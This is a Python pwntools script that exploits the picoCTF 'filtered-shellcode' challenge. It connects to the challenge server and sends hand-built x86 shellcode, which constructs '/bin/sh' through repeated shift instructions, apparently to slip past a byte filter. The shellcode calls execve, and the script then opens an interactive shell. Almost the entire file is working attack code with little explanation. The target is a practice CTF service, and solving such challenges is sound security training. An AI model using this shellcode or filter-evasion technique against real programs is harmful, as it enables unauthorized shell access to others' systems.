# picoCTF-filtered-shellcode-exploit.py
# by Aidan Wech (ahwech)
# nc mercury.picoctf.net 35338

from pwn import *

def main():
    # connection variables (remember to start up instance on picoCTF, port will vary!)
    host = "mercury.picoctf.net"
    port = 35338

    # variables
    # shellcode created by Massimiliano Pellizzer
    shellcode = asm(
        """
        /* make sure other args are empty */
        xor ecx, ecx
        xor edx, edx

        /* syscall execve */
        xor eax, eax
        mov al, 0xb

        /* "/sh\x00" */
        xor ebx, ebx
        mov bl, 0x68
        shl ebx
        shl ebx
        shl ebx
        shl ebx
        shl ebx
        shl ebx
        shl ebx
        shl ebx
        shl ebx
        shl ebx
        shl ebx
        shl ebx
        shl ebx
        shl ebx
        shl ebx
        shl ebx
        mov bh, 0x73
        mov bl, 0x2f
        push ebx
        nop
        
        /* "/bin" */
        mov bh, 0x6e
        mov bl, 0x69
        shl ebx
        shl ebx
        shl ebx
        shl ebx
        shl ebx
        shl ebx
        shl ebx
        shl ebx
        shl ebx
        shl ebx
        shl ebx
        shl ebx
        shl ebx
        shl ebx
        shl ebx
        shl ebx
        mov bh, 0x62
        mov bl, 0x2f
        push ebx
        nop
        
        /* move stack pointer, call */
        mov ebx, esp
        int 0x80
        """
    )

    p = remote(host, port)

    # send shellcode
    p.recvline(timeout=1)
    p.sendline(shellcode)
    p.interactive()

if __name__ == "__main__":
    main()